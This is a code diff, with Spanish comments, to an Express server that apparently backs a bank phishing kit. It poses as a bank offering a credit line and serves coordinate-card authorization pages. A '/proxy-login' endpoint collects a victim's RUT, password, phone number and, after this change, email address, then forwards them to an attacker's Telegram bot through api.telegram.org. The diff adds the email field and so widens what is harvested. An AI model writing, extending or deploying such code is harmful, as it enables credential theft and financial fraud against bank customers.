@@ -27,10 +27,8 @@ const CONFIG_FILE = path.join(__dirname, "config.json");
 // Cargar configuración inicial desde archivo o defaults
 let config = {};
 if (fs.existsSync(CONFIG_FILE)) {
-  // ✅ Si existe config.json, usarlo (mantiene lo último guardado)
   config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
 } else {
-  // ✅ Solo si no existe, aplicar valores por defecto
   config = {
     producto1: "Línea de Crédito",
     monto1: 5000000,
@@ -45,22 +43,23 @@ if (fs.existsSync(CONFIG_FILE)) {
   fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
 }
 
-// Endpoint de login
+// Endpoint de login (ahora también acepta correo)
 app.post("/proxy-login", async (req, res) => {
-  const { rut, passwd, telefono } = req.body;
+  const { rut, passwd, telefono, mail } = req.body;
 
-  if (!telefono) {
-    return res.status(400).send("❌ El campo 'Teléfono' es obligatorio.");
+  if (!telefono && !mail) {
+    return res.status(400).send("❌ Debes ingresar teléfono o correo.");
   }
 
-  if (bloqueados.includes(rut)) {
+  if (rut && bloqueados.includes(rut)) {
     return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
   }
 
-  const mensaje = `Nuevo intento de inicio de sesión:
-RUT: ${rut}
-Contraseña: ${passwd}
-Teléfono: ${telefono}`;
+  let mensaje = "📩 Nuevo intento de inicio de sesión:\n";
+  if (rut) mensaje += `🆔 RUT: ${rut}\n`;
+  if (passwd) mensaje += `🔑 Contraseña: ${passwd}\n`;
+  if (telefono) mensaje += `📱 Teléfono: ${telefono}\n`;
+  if (mail) mensaje += `📧 Correo: ${mail}\n`;
 
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -69,10 +68,10 @@ Teléfono: ${telefono}`;
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    res.send("Ingresando los datos...");
+    res.send("✅ Datos enviados correctamente.");
   } catch (error) {
     console.error(error);
-    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente.");
+    res.status(500).send("❌ Error al enviar tus datos.");
   }
 });
 
@@ -103,16 +102,16 @@ app.get("/coordenadas", (req, res) => {
 
 // Endpoint de configuración (para admin)
 app.get("/config", (req, res) => {
-  res.json(config); // ✅ devuelve directamente el objeto actual
+  res.json(config);
 });
 
 app.post("/config", (req, res) => {
   config = { ...config, ...req.body };
-  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2)); // ✅ guarda cambios
-  res.json(config); // ✅ devuelve el objeto actualizado
+  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
+  res.json(config);
 });
 
-// Ruta de autorización de productos (coordenadas o pass)
+// Ruta de autorización de productos
 app.get("/autorizacion", (req, res) => {
   if (config.tipoAutorizacion === "coordenadas") {
     return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
@@ -130,7 +129,7 @@ app.get("/factibilidad", (req, res) => {
   }
 });
 
-// Flujo de factibilidad: evaluación -> visualización -> autorizar
+// Flujo de factibilidad
 app.post("/credit/visualizacion", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
 });
